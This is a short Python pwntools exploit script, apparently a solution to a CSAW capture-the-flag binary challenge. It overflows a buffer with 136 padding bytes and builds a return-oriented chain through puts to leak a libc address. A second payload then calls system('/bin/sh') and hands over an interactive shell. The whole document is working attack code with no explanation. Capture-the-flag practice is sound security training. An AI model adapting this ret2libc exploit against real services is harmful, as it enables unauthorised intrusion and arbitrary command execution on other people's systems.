from pwn import *

r = remote('pwn.chal.csaw.io', 1006)
libc = ELF('./libc.so.6')

puts_plt = 0x401030
puts_got = 0x404018
pop_rdi = 0x4011eb
main = 0x401153

r.recvuntil('Would you like some popcorn?')
payload = 'A' * 136 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)

r.sendline(payload)
r.recv()
leak = u64(r.recvuntil('\x7f') + '\x00\x00')
print('puts@libc:', hex(leak))

libc.address = leak - libc.symbols['puts']
system = libc.symbols['system']
bin_sh = libc.search('/bin/sh').next()

r.recvuntil('Would you like some popcorn?')
payload = 'A' * 136 + p64(pop_rdi) + p64(bin_sh) + p64(system)
r.sendline(payload)

r.interactive()
